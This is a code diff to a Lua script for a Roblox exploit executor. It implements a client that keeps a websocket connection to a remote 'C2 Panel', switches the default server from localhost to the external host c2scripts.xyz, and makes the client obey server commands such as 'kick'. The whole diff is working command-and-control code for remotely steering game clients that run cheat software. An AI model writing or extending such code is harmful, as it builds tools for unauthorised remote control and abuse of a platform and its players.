@@ -995,41 +995,41 @@ task.spawn(function()
         end
     end)
 
+    local isC2Kicked = false
     local function maintainC2Connection()
-        while true do
-            local success, ws = pcall(function()
-                local wsFunc = (syn and syn.websocket and syn.websocket.connect) or WebSocket.connect
-                if wsFunc then
-                    local url = _G.C2_SERVER_URL or "ws://localhost:3000"
-                    return wsFunc(url)
-                end
-                return nil
-            end)
-
-            if success and ws then
-                print("🔌 Connected to Antigravity C2 Panel!")
-                _G.C2_WS = ws
-                
-                if _G.SetupC2Events then
-                    task.spawn(function() _G.SetupC2Events(ws) end)
-                end
-                
-                pcall(function()
-                    if ws.OnClose then
-                        ws.OnClose:Connect(function()
-                            print("⚠️ C2 Connection Lost! Reconnecting in 5s...")
-                            _G.C2_WS = nil
-                            task.wait(5)
-                            maintainC2Connection()
-                        end)
+        while not isC2Kicked do
+            if not _G.C2_WS then
+                local success, ws = pcall(function()
+                    local wsFunc = (syn and syn.websocket and syn.websocket.connect) or WebSocket.connect
+                    if wsFunc then
+                        local url = _G.C2_SERVER_URL or "wss://c2scripts.xyz/ws/c2/"
+                        return wsFunc(url)
                     end
+                    error("Executor does not support WebSockets!")
                 end)
-                
-                break
-            else
-                warn("⚠️ WebSocket C2 Server unreachable. Retrying in 10s...")
-                task.wait(10)
+
+                if success and ws then
+                    print("🔌 Connected to Snowflake C2 Panel!")
+                    _G.C2_WS = ws
+                    
+                    if _G.SetupC2Events then
+                        task.spawn(function() _G.SetupC2Events(ws) end)
+                    end
+                    
+                    pcall(function()
+                        if ws.OnClose then
+                            ws.OnClose:Connect(function()
+                                print("⚠️ C2 Connection Lost! Reconnecting in 10s...")
+                                _G.C2_WS = nil
+                            end)
+                        end
+                    end)
+                else
+                    warn("⚠️ WebSocket C2 Server unreachable. Retrying in 10s...")
+                end
             end
+            
+            task.wait(10)
         end
     end
 
@@ -1314,6 +1314,7 @@ task.spawn(function()
                 end)
             
             elseif data.command == "kick" then
+                isC2Kicked = true
                 local reason = (data.payload and data.payload.reason) or "Disconnected by C2 Server."
                 print("[C2 Client] Kicking player: " .. reason)
                 pcall(function()
